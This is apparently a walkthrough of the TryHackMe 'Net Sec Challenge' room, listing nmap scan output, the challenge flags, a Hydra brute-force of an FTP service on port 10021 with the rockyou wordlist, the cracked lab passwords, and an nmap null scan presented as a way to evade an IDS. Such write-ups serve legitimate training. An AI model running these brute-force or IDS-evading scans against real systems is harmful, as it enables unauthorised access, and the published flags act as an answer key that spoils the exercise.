# <div align='center'>[Net Sec Challenge - Tryhackme Walkthrough](https://tryhackme.com/room/netsecchallenge)</div>
<div align='center'>Practice the skills you have learned in the Network Security module.</div>
<div align='center'>
  <img width="200" height="200" alt="5a1f33f79fce3569a2bc247468713c93" src="https://github.com/user-attachments/assets/80e31da8-cfd7-4ba4-b29d-f5dee5544c5c" />
</div>

## Task 1. Introduction
Use this challenge to test your mastery of the skills you have acquired in the Network Security module. All the questions in this challenge can be solved using only nmap, telnet, and hydra.
```
Answer: No need
```

## Task 2. Challenge Questions
Starting with an Nmap aggressive scan and service/version detection across all ports:
```
nmap -sV -p- 10.201.27.157 -A

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
80/tcp    open  http        lighttpd
|_http-server-header: lighttpd THM{web_server_25352}
|_http-title: Hello, world!
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
8080/tcp  open  http        Node.js (Express middleware)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
10021/tcp open  ftp         vsftpd 3.0.5
```
### What is the highest port number being open less than 10,000?
```
8080
```
### There is an open port outside the common 1000 ports; it is above 10,000. What is it?
```
10021
```

### How many TCP ports are open?
```
6
```
### What is the flag hidden in the HTTP server header?
```
THM{web_server_25352}
```

### What is the flag hidden in the SSH server header?
```
THM{946219583339}
```

### We have an FTP server listening on a nonstandard port. What is the version of the FTP server?
```
vsftpd 3.0.5
```
## Hydra
Create a file with both usernames:
```
echo "eddie
quinn" > user.txt
```
Run Hydra to brute-force FTP on port 10021 using the rockyou wordlist:

```
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ftp://10.201.27.157:10021
```
Credentials:
```
login: eddie   password: jordan
login: quinn   password: andrea
```
## FTP Access & Flag (first‑person plural)

We found an FTP service on a non‑standard port and connected to it using the credentials we recovered:
```
ftp 10.201.27.157 10021
Name (10.201.27.157:root): quinn
Password: andrea
```

Login succeeded:
```
230 Login successful.
ftp> ls
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
```

We downloaded the file and read the flag:
```
ftp> get ftp_flag.txt
# then on attacker machine
cat ftp_flag.txt
```
```
### We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?
```
THM{321452667098}
```

To avoid detection by the IDS, use:

```bash
nmap -sN <ip>
```
<img width="623" height="423" alt="Screenshot 2025-10-01 195557" src="https://github.com/user-attachments/assets/91cbd2ac-5530-46c6-a700-4ab8289ba3b4" />

### Browsing to `http://MACHINE_IP:8080` displays a small challenge that will give you a flag once you solve it. What is the flag?
```
THM{f7443f99}
```

<img width="985" height="577" alt="Screenshot 2025-10-01 195514" src="https://github.com/user-attachments/assets/dd5eee08-e567-4164-92d9-435f71f9a82d" />
